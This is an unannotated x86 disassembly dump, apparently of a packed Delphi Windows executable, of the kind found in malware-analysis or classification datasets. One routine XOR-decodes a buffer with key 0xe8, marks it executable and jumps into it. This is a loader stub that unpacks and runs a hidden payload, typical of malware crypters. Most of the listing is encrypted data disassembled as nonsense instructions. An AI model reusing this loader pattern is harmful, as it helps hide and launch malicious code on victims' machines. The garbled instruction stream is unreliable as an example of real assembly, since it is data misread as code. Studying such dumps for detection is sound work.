add [ edx + 0x1db80044 ] bh
inc esp
add [ eax - 0x23ffbbde ] ah
cmp al 0x45
add al ch
push ebx
inc ebp
add [ eax + edi * 8 + 0x43 ] ch
add [ eax + 0x640c0045 ] ch
inc ebp
add al cl
bound eax [ ebp ]
add al 0xf9
inc ebx
add [ eax ] cl
stc
inc ebx
add [ ebp + 0x45 ] al
add [ eax - 0x9 ] ch
inc ebx
add al ah
and eax [ eax + eax + 0x38 ]
insb
inc ebp
add [ ebp + esi + 0x205c0044 ] dh
inc esp
add [ ecx + eax * 4 + 0x45 ] cl
add al dl
inc ebp
add [ eax + 0x2c004539 ] al
jb r-xdata
outsd
js r-xdata
add [ eax + 0x42 ] ch
inc ebp
add ah ah
inc edx
inc ebp
add [ eax * 4 + 0x3fa00045 ] ch
inc ebp
add [ eax ] dh
add [ ebp ] 0x10
inc ebp
add ah ah
add [ ebp ] sub_454cc8
push cs
add [ ecx - 0x33 ] dl
inc ebp
add al bh
add al [ eax ]
add [ eax ] al
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
or al 0x3
add [ eax ] al
add eax 0x64450500
add [ ebx ] al
add [ eax ] al
add al [ eax ]
push es
push eax
popad
outsb
insb
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
or eax [ ecx + 0x63 ]
je r-xdata
add [ eax ] al
add al 0x0
cld
add al [ eax ]
add [ ecx ] al
add [ ecx ] cl
inc edi
jb r-xdata
nop
mov ebp cs
je r-xdata
insb
outsd
xor [ bx + si ] ebp
imul esi [ ecx + esi + 0x10 ] 0x6000003
add [ ecx ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x31756e65
adc al 0x3
add [ eax ] al
pop es
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ebx
add eax [ eax ]
add [ esi ] al
add [ ecx ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x32756e65
sbb al 0x3
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30c31
add [ 0x64450500 ] al
add [ eax ] al
or [ eax ] al
add eax 0x6f6d654d
xor [ eax ] esp
add eax [ eax ]
add [ ecx ] cl
add [ edi ] al
inc edx
jne r-xdata
xor bl [ ebx + eax ]
jne r-xdata
add [ ebx - 0x1 ] dl
adc eax rw-data
mov edx 0x59a8
mov eax ebx
call sub_45cda8
nop
nop
add ebx 0x1929
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
xor [ eax - 0x35 ] edi
inc ebp
add [ eax + 0x5e004514 ] cl
add [ 0x74696e55 ] al
xor [ eax ] eax
add [ ebx - 0x74a9ac40 ] cl
fimul [ ebx + 0x6a006af0 ]
add al ch
lodsd [ esi ]
xchg esi eax
cli
dec [ ebx + 0x72d285d3 ]
adc eax 0x8dc03342
or al 0x30
xchg [ edx ] al
outsb
xor [ ebx + eax ] esp
add [ eax ] al
or al [ eax ]
or al 0x50
jb r-xdata
outsb
imul esi [ ecx + esi ] 0x53c08b00
push esi
imul esi [ esp + esi * 2 + 0x65 ] 0x32c3172
add [ eax ] al
or al 0x0
or [ ebx + 0x6f ] eax
insb
outsd
jb r-xdata
inc edx
mov cl [ ecx ]
xor cl 0xe8
lea ebx [ eax + esi ]
mov [ ebx ] cl
nop
inc eax
dec edx
jne r-xdata
lea ecx [ eax + esi ]
pop esi
pop ebx
retn
inc ebp
outsb
je r-xdata
inc edx
xor eax eax
add [ edi ] al
int 0x45
outsd
js r-xdata
fiadd [ edx ]
inc esp
test eax 0xd2600044
inc edx
add al dl
in eax 0x42
add [ eax - 0xa ] cl
inc edx
add [ eax - 0x6bffbda3 ] bl
add [ edx ] 0x28
add eax [ eax ]
add [ ebx ] cl
add [ ecx ] cl
push ebx
jo r-xdata
imul esp [ ecx + 0x6c ] 0x2831676f
push es
push esp
inc esi
outsd
jb r-xdata
cwde
pop ebp
inc edx
add [ eax + eax * 4 - 0x79d7ffbe ] dl
inc edx
add [ eax + r-xdata ] dl
pop es
push es
push esp
inc esi
outsd
jb r-xdata
xor [ 0x43054000 ] ecx
add [ ecx + ecx * 8 + 0x6ee80042 ] ah
inc edx
add [ ecx + edi * 2 + 0x42 ] bh
add ah bh
jbe r-xdata
mov ebx edx
mov esi eax
push 0x0
push 0x0
call GetAncestor
mov edx ebx
test edx edx
jb r-xdata
add ah bh
sub_45cda8
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
push 0x0
call GetAncestor
mov edx ebx
test edx edx
jb r-xdata
pop esi
pop ebx
retn
inc edx
xor eax eax
lea ecx [ eax + esi ]
mov cl [ ecx ]
xor cl 0xe8
lea ebx [ eax + esi ]
mov [ ebx ] cl
nop
inc eax
dec edx
jne r-xdata
sub_45cdd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
test ebx ebx
je r-xdata
push r-xdata
call sub_45cdd8
js r-xdata
nop
nop
lea eax [ ebp - 0x8 ]
in al dx
call 0xfffffffff8723a98
js r-xdata
call 0xffffffff81c87fa9
add [ ebp + esi * 8 + 0x7878e8e8 ] eax
js r-xdata
call 0x223dfb1c
sub edi [ eax + 0x78 ]
js r-xdata
loop r-xdata
popad
mov ch 0x1a
add [ ecx - 0x4a9e714d ] 0x1c
arpl [ edi ] si
mov al 0x82
js r-xdata
and [ ebx ] ebp
sub al 0xf8
js r-xdata
js r-xdata
call 0x38b3348d
adc eax 0xb8bb1717
js r-xdata
js r-xdata
add [ ecx ] 0xe8e8f584
js r-xdata
insd
pop ss
add ebx esi
fld1
call 0x78be473b
js r-xdata
js r-xdata
retn
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ eax + 0x78e8e8d2 ] ecx
js r-xdata
sub eax [ ecx ]
mov ah 0xe2
call 0x6dab8db6
cmp [ 0xffffffffb8bb1717 ] dl
push eax
push 0x40
push 0x59a8
push ebx
call [ rw-data ]
mov edx 0x59a8
mov eax ebx
call sub_45cda8
nop
nop
add ebx 0x1929
mov [ ebp - 0x4 ] ebx
nop
nop
jmp [ ebp - 0x4 ]
inc ebp
clc
arpl [ ecx + edi * 4 ] ax
mov edi 0x7f171063
inc eax
call 0x28b3b730
add [ edi + 0x78e8e8d2 ] esp
popad
lodsb [ esi ]
int3
add [ ebp + 0x78e8e8e4 ] esi
js r-xdata
js r-xdata
js r-xdata
jg r-xdata
out 0x6d eax
adc ch dl
js r-xdata
fld [ eax ]
test al 0x1
add [ esi - 0x33539e72 ] 0xa8
mov al 0x82
jmp 0xffffffffccf230fa
mov fs [ ecx - 0x4b ]
push ds
arpl [ eax ] si
add [ ebx ] ebp
lodsb [ esi ]
call 0x18a98e3c
sbb al 0x63
aaa
add al 0x1
fisubr [ edi + 0x7878e8e8 ]
js r-xdata
popad
lodsd [ esi ]
adc bl dl
das
js r-xdata
in eax 0xe8
call 0x1f684bf
xor [ ecx + 0x7878e8e8 ] edi
call 0x28b3b91b
out 0x6d eax
shr al 0xe8
call 0xffffffffccdaa1a5
fsub st7
insb
fdivp st6
call 0xffffffffff09d1af
call 0x50be48b4
movsd [ edi ] [ esi ]
mov dl 0xe8
call 0xffffffffe82fa162
insd
cmp al 0xc7
mov fs [ ecx - 0x53 ]
js r-xdata
call 0x78be4801
js r-xdata
mov eax 0xb817ad65
insd
cmp al 0x15
pop ss
pop ss
mov eax 0xe8ece200
lodsb [ esi ]
int3
and [ ecx + 0xcad618e ] 0xb0
or [ esi + ecx * 4 - 0x4ff1529f ] 0x82
lea ecx [ esi - 0x4fff529f ]
add [ esi + 0x2ad618e ] 0xb0
add [ esi - 0x2c ] ebx
call 0x78be47f6
out 0x6c eax
xchg edi eax
cmpsd [ esi ] [ edi ]
call 0xffffffffa5ab90b3
adc al 0x1
jno r-xdata
add [ eax ] esp
movsd [ edi ] [ esi ]
call 0x10f332a8
shr [ edi ] cl
call 0x78be49bc
popad
lodsd [ esi ]
sbb al 0x50
call 0xffffffffe7eeb9c5
dec edx
popad
mov ch 0x14
popad
movsd [ edi ] [ esi ]
adc [ ecx ] al
mov ecx 0x78e8e8f8
pop ss
pushfd
int3
jge r-xdata
js r-xdata
js r-xdata
adc al 0x17
js r-xdata
xor ah [ ebx + 0x29 ]
mov fs [ ecx - 0x53 ]
lodsd [ esi ]
js r-xdata
call 0xffffffffbe5d8bf4
test al 0x1
sub al 0xa6
call 0x65be496d
lodsd [ esi ]
sbb [ eax - 0x47bf529b ] bh
add [ edi + 0x63e8e8e4 ] eax
lodsd [ gs : esi ]
and al 0x1
mov edx 0x78e8e8e0
js r-xdata
mov ecx 0xe8a8b801
arpl [ ecx ] bp
add ebp edx
retn
call 0xffffffffd4ef33c4
add [ ebx + 0x78e8e8e6 ] ecx
js r-xdata
add [ ebx - 0x54 ] cl
js r-xdata
call 0x78be497c
js r-xdata
xchg ebp eax
adc [ ecx ] al
salc
0x7878e8e8 0x7878
pop ss
mov eax 0xe8c77c00
js r-xdata
dec edi
call 0xffffffffde1cd20f
lodsb [ esi ]
js r-xdata
js r-xdata
lodsd [ esi ]
cmp al 0xa5
or [ ebx + 0x30ad2f9a ] 0x8e879b87
das
lodsd [ esi ]
xor al 0x9c
call 0xffffffffbdfbd211
call 0xffffffffada94956
add [ edi + eax * 8 - 0x18 ] bh
js r-xdata
dec edx
call 0xffffffffe923a729
js r-xdata
js r-xdata
js r-xdata
js r-xdata
mov ch 0x14
popad
movsd [ edi ] [ esi ]
sbb al 0x61
mov ebp 0x14ad6310
popad
lodsd [ esi ]
or al 0x63
lodsd [ esi ]
adc [ ecx - 0x53 ] ah
add [ ebx - 0x53 ] ah
sbb al 0x61
lodsd [ esi ]
add al 0xdb
sub [ ecx - 0x53 ] ah
js r-xdata
add [ edx - 0x29 ] edx
call 0x78be48da
js r-xdata
call 0x7f5d48a5
or al ch
call 0xffffffffe76e3e1c
insd
xlat
fucomp st0
js r-xdata
mov fs [ ecx - 0x43 ]
sbb dh [ edx + 0x618e8482 ]
js r-xdata
sbb al 0xdb
pop ss
arpl [ ebp + edx * 2 + 0x6321db0c ] bx
mov ch 0x1c
arpl [ esi ] di
cmp edx [ edx ]
pop ss
lodsd [ esi ]
sbb al 0x6b
sub eax esp
pushad
mov esp 0x116b2cf5
enter 0x6ae7 0xe
pop ss
pop ss
pop ss
scasd [ edi ]
imul edx [ edi ] 0xffffffeb
add [ edx + 0x78e8e8fa ] esi
js r-xdata
arpl [ ebp + 0x4ad611c ] bp
fld [ eax ]
popad
lodsd [ esi ]
add [ edx ] edx
sti
call 0xffffffffaebe4a8c
rcr [ eax ] cl
out 0x6a eax
0x2bfc8997
call 0xffffffff805635eb
and eax 0x188f952
fwait
mov ecx 0x7878e8e8
js r-xdata
js r-xdata
arpl [ ebp + 0x8a56510 ] bp
js r-xdata
call 0x17be4914
js r-xdata
adc al 0x17
call 0x7547bb2d
jecxz r-xdata
jg r-xdata
mov ebp 0x8482b21a
mov fs [ ecx - 0x43 ]
and [ ebx + 0x38 ] ah
js r-xdata
popad
add [ edx ] esp
cmpsd [ esi ] [ edi ]
call 0x17be4b26
fwait
add [ edx - 0x7117172e ] ecx
popad
mov ebp 0x618eb204
mov ebp 0x63858206
cmp [ esi - 0x24e7429f ] ecx
cmp cl [ esi - 0x4de5429f ]
add [ esi + ecx * 4 + 0x6320bd61 ] 0x38
enter 0x9ea0 0x2f
lodsd [ esi ]
sub al 0xbe
movsd [ edi ] [ esi ]
lahf
mov [ edi ] ebp
pushfd
lodsd [ esi ]
add ecx ebp
shr al 0xe8
popad
lodsd [ esi ]
and al 0xb0
add [ edi - 0x71627d4e ] 0x61
adc [ ebp - 0x5b ] ah
js r-xdata
js r-xdata
js r-xdata
0x6dea006b 0xe728
js r-xdata
and ah [ edi + 0x7878e8e8 ]
pop ss
test [ esi + 0x6320bd61 ] cl
cmp [ ecx ] al
call 0x78be4ac4
js r-xdata
mov dl 0x82
js r-xdata
or [ ecx - 0x175747ff ] bh
movsd [ edi ] [ esi ]
mov ebp 0xe8a0c101
call 0xffffffff8ede527a
popad
lodsd [ esi ]
cmp [ ecx ] al
mov dl 0xf3
call 0xffffffffe0f333f5
add [ esi ] dl
fsubp st0
call 0xffffffffe76e3dc7
insd
xor ecx ebx
call 0x7870f206
mov eax 0xe8ac4b00
call 0x78be4990
js r-xdata
pop ss
js r-xdata
add dl ch
js r-xdata
popfd
stosb [ edi ]
call 0xffffffffe4723e3d
add [ ebx ] dl
lodsd [ esi ]
call 0xffffffffe775a645
insb
js r-xdata
lodsd [ esi ]
and [ edx + 0x2fa5be8d ] bl
lodsd [ esi ]
and al 0x9f
mov [ edx - 0x5e4bfe73 ] ebx
call 0x78be4a1f
mov cl 0xb1
insd
sub bh ah
insd
xor al 0xa5
call 0xffffffffccf1e89f
clc
xor al 0xb0
add ebp ebp
loop r-xdata
insd
insd
sub bh ah
insb
js r-xdata
pop ss
js r-xdata
and [ ebx ] ebp
imul edx [ edx ] 0xffffffc3
add [ ebx - 0x52 ] edx
call 0xffffffff8ebe4b85
popad
lodsd [ esi ]
cmp al 0x63
sub [ esi - 0x4fc1529f ] ecx
add [ esi ] esi
adc al 0x17
pop ss
pop ss
js r-xdata
mov ebp 0x1386320
popad
lodsd [ gs : esi ]
adc al 0xb8
xor bh 0x1
mov ebp 0x65e8e8c4
insd
mov ah 0x15
pop ss
pop ss
add [ esi ] esi
cmpsb [ esi ] [ edi ]
call 0xfffffffffd03e9ba
popad
push ebp
cmp al 0x15
pop ss
pop ss
insd
sub [ ecx ] al
and edi eax
call 0x78be4aca
js r-xdata
call 0x26a9bc1c
sub [ ecx ] ecx
in eax dx
arpl [ esi ] dx
sub [ edi ] eax
0x56e727eb 0xebd2
out 0x6c eax
js r-xdata
mov ch 0xe4
js r-xdata
fisub [ eax + ebp * 8 - 0x36c9fe18 ]
call 0x78be4b52
mov ecx 0x11c9d17
popfd
imul al
call 0x1e35529
jae r-xdata
out 0x6c eax
js r-xdata
js r-xdata
mov ebx 0xbf17dbbf
mov edi 0x82bfea82
0xe8e8e880 0x17a8
add ecx ecx

arpl [ ecx ] si
mov fs [ ecx - 0x4b ]
out 0x63 al
xor [ ecx ] al
pushfd
mov al [ 0x7878e8e8 ]
js r-xdata
pop ss
mov esi 0xbe17bbdc
aam 0xdb
sub cl dl
xchg ebp eax
adc al 0xe7
jl r-xdata
out 0x6c eax
pop edx
int1
call 0x23254d7
0x78e8e8ba 0x6178
outsb
and al ch
call 0xfffffffffa33d2e6
popfd
add [ ebx + 0x17 ] esi
arpl [ ecx + edi * 4 ] ax
mov bh 0xb3
sub_45f763
popad
lodsd [ esi ]
adc [ ecx ] al
lodsd [ esi ]
adc [ edi ] dl
pop ss
js r-xdata
popad
js r-xdata
cmp [ ebx ] cl
pop ss
pop ss
add [ esi + ecx + 0x17 ] ebp
pop ss
adc al 0x1
js r-xdata
call 0x61d47179
js r-xdata
in ax 0xe8
call 0x68a97069
dec esp
call 0xffffffffc147e0df
js r-xdata
js r-xdata
js r-xdata
lodsd [ gs : esi ]
sbb al 0x82
call 0xfffffffff4acf8ee
call 0xfffffffff8f35c23
imul ecx [ ebp + 0x2c6be810 ] 0xffffffe4
sub al 0x1
sub eax 0x65e8e8e9
lodsd [ esi ]
cmp [ eax + 0x17133101 ] bh
mov esi 0x821063ec
adc dl [ edi ]
pop ss
js r-xdata
call 0x63be70d8
push 0xe8e8e84c
add ecx eax
pop ss
jle r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
add dl bl
popad
mov ebp 0x1b970132
pop ss
pop ss
js r-xdata
call 0xffffffffb3fde063
and [ ebx ] ebp
loopne r-xdata
js r-xdata
mov ebx 0xe8ce0e01
call 0x78be7210
js r-xdata
js r-xdata
imul ebp [ esi ] 0xffffffea
mov gs [ ebx - 0x2a ]
call 0xffffffffe90fe2aa
call 0x78be7126
js r-xdata
add edi ebx
js r-xdata
insd
js r-xdata
out 0x6c eax
out 0x0 eax
pop ss
pop ss
mov ebx 0x17141001
pop ss
js r-xdata
cld
xchg esi eax
insd
push ds
popad
push cs
js r-xdata
or dl 0x1
test eax 0x7817171c
js r-xdata
sub al 0xe4
insd
js r-xdata
add [ edi ] edx
js r-xdata
mov fs [ ecx - 0x4b ]
mov edx 0xe8c74a01
call 0x78be708a
js r-xdata
js r-xdata
call 0xffffffff9d5d739f
js r-xdata
js r-xdata
mov esi 0x7e17bfb8
inc esp
call 0x847e35e
call 0x17be7364
arpl [ ebp + 0x1d540114 ] sp
pop ss
pop ss
js r-xdata
call 0xffffffffdd47b303
call 0xfffffffffcdbfbf6
js r-xdata
call 0x78be727f
js r-xdata
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
call 0xfffffffff87264ac
add [ edx - 0x1e ] esp
call 0x78be71b4
call 0x78be71c7
js r-xdata
js r-xdata
pop ss
arpl [ eax ] bx
insd
js r-xdata
mov ch 0xba
js r-xdata
test al 0xdb
sub [ eax - 0x1701a6ff ] bh
call 0xffffffffe2a5e2a3
mov fs [ ecx - 0x1c ]
insd
xchg esp eax
adc eax 0xfa011717
sbb [ edi ] dl
pop ss
js r-xdata
js r-xdata
js r-xdata
jl r-xdata
js r-xdata
adc dl al
call 0xffffffffe10412d1
shl [ esp + ecx * 8 + 0x1b6ce7fc ] 0x1
std
das
cwde
loopne r-xdata
or bl dh
js r-xdata
pop ss
pop ss
mov cl 0x65
lodsd [ esi ]
or al 0xb8
arpl [ ebp - 0x5a9e7120 ] bp
adc [ eax ] al
or esp esp
call 0xfffffffff3761a1a
sub [ ecx + 0x2b21301f ] dh
js r-xdata
add [ esi - 0x47171704 ] edx
add ebp ebx
cmp [ ebx + 0x2a ] ah
mov fs [ ecx - 0x53 ]
0xa901
mov fs [ ecx - 0x53 ]
cmp dh [ eax + 0x1601c682 ]
or eax 0x4a801717
dec esi
mov [ ebx ] eax
mov edi 0x1712e800
pop ss
cmp [ 0xffffffffbfca8ca7 ] 0x61
scasb [ edi ]
rol [ eax ] 0x1
sbb dl [ ecx ]
arpl [ edx ] bp
add [ esp + edi * 8 - 0x18 ] ecx
call 0x6562a696
lodsd [ esi ]
sbb al 0xb8
add [ ebx - 0x5 ] edi
call 0x6d2d7228
mov esi 0x1e6d1963
add al 0x15
pop ss
pop ss
mov eax 0x1c4bf17
ja r-xdata
imul ebp [ esp ] 0x65
insd
scasb [ edi ]
sub edi [ edi + edi * 4 + 0x61 ]
js r-xdata
js r-xdata
js r-xdata
out 0x6c eax
and bh bh
call 0xffffffffcef6fa4e
call 0x78be7153
js r-xdata
sbb [ ebp + 0x1e ] ch
js r-xdata
shr eax 0xe8
js r-xdata
js r-xdata
add [ edx - 0x39 ] ecx
call 0x78be70f9
js r-xdata
js r-xdata
add [ edx - 0x18 ] ah
call 0xc6dfc3a
pop ss
pop ss
popfd
add [ edi ] dl
jg r-xdata
call 0x22ab0a3
loopne r-xdata
popfd
add edx esi
std
call 0x78be7391
js r-xdata
add [ cs : edx - 0x4e171733 ] dl
lodsb [ gs : esi ]
int3
adc eax 0x1bb1717
popad
js r-xdata
call 0x17be7364
js r-xdata
or al 0x11
mov edi 0xd4ae61
js r-xdata
adc [ ecx - 0x4083d43a ] 0x61
js r-xdata
js r-xdata
push ds
js r-xdata
jle r-xdata
lodsd [ esi ]
popad
sbb al 0x1
fst [ edi + edx ]
pop ss
js r-xdata
call 0xffffffffada7870a
pop ss
jmp r-xdata
js r-xdata
or esp ebp
call 0x2ced0c1
call 0xffffffffe0b5e2c6
call 0x10c6e3cb
retn 0xe8e8
call 0xffffffffb617e3b8
pop ecx
mov cl 0x8c
arpl cx bp
add [ ecx - 0x37 ] ebx
aam 0x0
js r-xdata
js r-xdata
add [ eax ] esi
clc
call 0x78be72f1
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
call 0x38f35e34
mov eax 0x17133101
lodsd [ esi ]
js r-xdata
call 0xffffffff8b47e10d
int1
call 0x78be7113
js r-xdata
js r-xdata
call 0x2b67ab34
js r-xdata
js r-xdata
js r-xdata
push edi
inc eax
mov eax ebp
call 0xfffffffff112a72b
jo r-xdata
pop ss
pop ss
lodsd [ gs : esi ]
clc
popad
lodsd [ esi ]
adc al 0x6b
lodsd [ esi ]
adc al 0xec
out 0x5f eax
sub ah [ ebp - 0x50 ]
0x83ed2883 0xed33
call 0x2847ac70
or al 0x17
js r-xdata
pop ss
add [ ecx + edx ] cl
js r-xdata
js r-xdata
out 0x6d eax
js r-xdata
add edx ebp
leave
call 0x78be7195
insd
pop ds
js r-xdata
sub cl 0x80
call 0x1aee42f
push esi
xor dl [ edi ]
js r-xdata
in al 0x1
call 0xb10fceb
pop ss
pop ss
js r-xdata
mov cl 0x1
sub [ edi + edx ] cl
js r-xdata
pop ss
adc [ edi ] edx
js r-xdata
js r-xdata
test eax 0xdbe8e8f0
and [ ecx ] eax
fcomip st0
call 0x78be7236
call 0xffffffffb4a7e1e9
int3
out dx eax
call 0x1801e1e2
js r-xdata
pop ss
pop ss
mov cl 0xb1
add [ edx ] ebp
sbb eax 0xbf781717
add ebx ecx
loopne r-xdata
imul ebp [ edi ] 0xe8e8e822
add [ edx + edi * 8 + 0x7878e8e8 ] esi
js r-xdata
pop ss
pop ss
add [ 0x78171701 ] esi
js r-xdata
lodsd [ gs : esi ]
sub bl bl
and [ esi - 0x429e7148 ] edi
push cs
add [ edx + 0x78e8e8fa ] edi
js r-xdata
mov edx 0x78e8e8fa
mov eax 0xe8c94901
call 0xffffffffbcb3610f
adc edx [ edi ]
sbb [ ecx - 0x20 ] 0xec
js r-xdata
call 0xffffffff898652de
call 0xffffffffccf22ae3
insb
sbb edi ebp
pop edi
fadd [ ecx ]
xor ecx [ eax ]
pop ss
pop ss
js r-xdata
into
add [ esi ] ecx
call 0x226e2fc
js r-xdata
js r-xdata
call 0x7e5db4e3
inc esp
js r-xdata
js r-xdata
call 0x78be753f
js r-xdata
call 0x78be7531
js r-xdata
insd
sub bh ah
insd
scasd [ edi ]
push cs
pop ss
pop ss
lodsd [ gs : esi ]
xor al 0x1
shr al 0xe8
js r-xdata
loopne r-xdata
js r-xdata
js r-xdata
add [ esi ] eax
int 0xe8
call 0x78be7391
js r-xdata
pop ecx
js r-xdata
js r-xdata
mov ebx 0xe8447e17
call 0xffffffffccfa5aea
js r-xdata
js r-xdata
arpl [ esp + ecx * 8 + 0x161a00c0 ] bp
sub al 0xe4
popad
out 0x6c eax
js r-xdata
pop esi
sub al 0xe8
call 0x5c603c
nop
aaa
js r-xdata
pop ss
push cs
pop ss
pop ss
js r-xdata
lodsb [ esi ]
clc
cmp [ ecx ] al
js r-xdata
pop ss
pop ss
pop ds
mov edi 0xa8ae61
adc [ edi ] edx
pop ss
sub dh 0x1
mov eax 0x78e8e8c8
shl esi 0x5f
js r-xdata
js r-xdata
js r-xdata
in al dx
js r-xdata
js r-xdata
jle r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x17855254
pop ss
lodsd [ gs : esi ]
add eax ebx
js r-xdata
js r-xdata
call 0x78be7557
js r-xdata
lodsb [ esi ]
int3
xor al 0x17
js r-xdata
pop ss
pop ss
js r-xdata
call 0x78be7401
js r-xdata
pop ss
pop ss
js r-xdata
or [ ebp - 0x40e040e5 ] 0x61
scasb [ edi ]
js r-xdata
mov edi 0xe8406e61
call 0x1f94fcf7
pop edi
js r-xdata
pop ss
pop ss
imul ebp [ eax + ebp * 4 ] 0xffffff80
cmp ebx ecx
mov esi 0x446e61bf
call 0x7b46e50a
pop ds
pop ss
pop ss
xor [ ebx - 0x40e79d63 ] 0x61
scasb [ edi ]
movsb [ edi ] [ esi ]
add [ ebp + 0x1f ] ch
dec edi
js r-xdata
sub [ eax + 0x1b828db ] 0x59
js r-xdata
js r-xdata
out dx al
add [ eax + 0x78e8e8c8 ] edi
js r-xdata
arpl [ eax ] si
imul edx [ ebx ] 0x17
add [ edx - 0x3f ] esi
call 0xffffffff95a7159f
adc al 0x1
outsd
in eax 0xe8
call 0xffffffffb86ee99f
add edi edx
call 0x78bee716
js r-xdata
pop ss
lodsd [ esi ]
adc [ ebx - 0x53 ] ch
adc al 0xc0
add [ ebp - 0x33 ] ebp
call 0x1a097697
insb
cmp al [ ecx ]
xchg ebx eax
in eax dx
call 0xffffffffcdc876a1
mov fs [ ecx - 0x53 ]
sbb dh [ eax + 0x21018182 ]
out 0x6d eax
out 0x5f eax
out dx eax
mov eax 0xeaaf638e
mov gs bx
lodsb [ esi ]
int3
pop ss
add bl ah
add [ edi ] edx
pop ss
jge r-xdata
movsb [ edi ] [ esi ]
int3
call 0x78be75d9
js r-xdata
mov ebx 0xe8ec0e01
js r-xdata
js r-xdata
js r-xdata
push esi
insd
js r-xdata
js r-xdata
pop ss
imul ebp [ esp ] 0x61
js r-xdata
imul ebp [ esp ] 0x1
js r-xdata
out 0x5f al
js r-xdata
pop ss
mov eax 0xe8007f17
call 0xffffffffb872674c
lodsd [ gs : esi ]
sub [ eax - 0x7d41167e ] bh
jmp r-xdata
sub [ esi - 0x17060aff ] dh
lodsb [ esi ]
add [ edi + 0x78171710 ] ebx
js r-xdata
sbb edi [ edi - 0x519e40e1 ]
js r-xdata
pop ss
js r-xdata
push 0x17325601
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
add bl al
int1
call 0x23e7e87
outsd
js r-xdata
js r-xdata
add [ eax + 0x17 ] ecx
pop ss
pop ss
sub al 0xf8
call 0x1f94009d
pop ss
pop ss
js r-xdata
js r-xdata
call 0xffffffffb2eb4fd2
call 0x1decffd7
pop ss
pop ss
mov cl 0xb1
and [ ebx ] ebp
js r-xdata
adc edx [ edi ]
pop ss
add dh cl
cmp edx [ edi ]
pop ss
pop ds
xor bl dh
sub [ eax + 0x78782b21 ] ch
js r-xdata
sbb dl [ esi ]
or esi esp
call 0x1367feba
pop ss
pop ss
js r-xdata
insb
sbb [ ebx - 0x1713f1ff ] bh
js r-xdata
js r-xdata
sahf
push ss
in al 0x1
js r-xdata
mov bh 0xb6
mov bl 0x21
sub edi [ eax + 0x78 ]
sbb [ ebp + 0x1e ] ebp
mov esi 0xe8eba101
call 0x68be71f0
xchg ebp eax
clc
jmp 0xfffffffff4216766
add [ edi + 0x1f ] cl
js r-xdata
pop ss
cld
add ah bh
iretd
popad
mov ah 0xcc
popfd
adc [ ecx - 0x53 ] ah
cmp [ ecx ] al
mov edi 0xe7171717
insd
call 0xffffffffe85a8ca1
add [ eax ] ecx
call 0x78be7826
js r-xdata
fld [ eax ]
mov dh 0x21
sub edx [ edi ]
pop ss
add [ ecx ] esp
popad
lodsd [ esi ]
push es
mov al 0x82
enter 0x618e 0xad
sbb [ eax + 0x17179d01 ] dh
pop ss
js r-xdata
pop ss
js r-xdata
js r-xdata
push cs
add esi esi
sbb edx [ edi ]
pop ss
js r-xdata
js r-xdata
retn 0xe8e8
add cl bl
sbb dl [ edi ]
add [ esi ] ecx
in al dx
call 0x78be7648
js r-xdata
js r-xdata
js r-xdata
pop ds
js r-xdata
pop ss
pop edi
js r-xdata
sub al 0xf8
js r-xdata
mov eax 0x149d178c
and [ ebx ] ebp
js r-xdata
add [ eax - 0x71e8e8cb ] esp
js r-xdata
js r-xdata
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
add al 0x60
0xa551e8e8 0xe8b2
js r-xdata
or [ ebp + 0x58 ] 0xf3
sar [ edi + 0x19cae61 ] 0x89
and [ ebx ] ebp
popad
js r-xdata
pop ss
pop ss
js r-xdata
shl [ ebp - 0x3c9218ec ] 0x1
aaa
pop ss
pop ss
mov eax 0x17357801
pop ss
js r-xdata
retn
pop ss
add [ esi + 0x1e8e8fc ] dl
or eax 0xbfe8e8fb
das
lodsd [ esi ]
js r-xdata
sub al 0xe8
call 0xbe401a9
pop ss
pop ss
add [ ecx + 0x78e8e8eb ] ebp
js r-xdata
cmp dl [ edi ]
sub ah 0x80
call 0xffffffff812ee822
call 0xffffffffbc2ee847
add [ ecx ] eax
js r-xdata
mov fs [ ecx - 0x53 ]
call 0x147bb39
clc
fld [ eax ]
test al 0xb7
and [ ebx ] ebp
js r-xdata
pop ss
js r-xdata
add [ 0x78171736 ] edi
js r-xdata
mov ebp 0x34a3010c
xor eax 0x618e1717
js r-xdata
popad
mov al [ 0xffffffff8e171735 ]
js r-xdata
mov esi 0x5ee71863
out dx al
mov edi 0xe8cd2b01
call 0xffffffff8cb36383
pop ss
pop ss
pop ss
mov eax 0xc882bebe
mov esi 0xe8ecd101
js r-xdata
js r-xdata
js r-xdata
js r-xdata
pop ss
pop ss
add [ edi + 0x7817171c ] esi
js r-xdata
inc eax
push ds
mov fs [ ecx - 0x53 ]
js r-xdata
js r-xdata
js r-xdata
popad
lodsd [ esi ]
js r-xdata
pop ss
arpl [ eax ] bx
rcr [ ebx ] cl
out 0x6c eax
fstp [ edx ]
pop ss
js r-xdata
sub al 0xe4
popad
rcl [ ebx ] cl
add [ edi + 0x7817171d ] ecx
js r-xdata
add al 0x8b
xchg [ eax + 0x18ad2f91 ] ebx
enter 0x8ac7 0xc8
das
lodsd [ esi ]
sbb al 0xca
int 0x84
fwait
add esi eax
push cs
pop ss
pop ss
js r-xdata
xchg esi eax
cld
js r-xdata
je r-xdata
lodsd [ esi ]
call 0xffffffffe93c28ec
js r-xdata
pop ss
js r-xdata
mov [ edi ] ss
js r-xdata
arpl [ eax ] bx
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
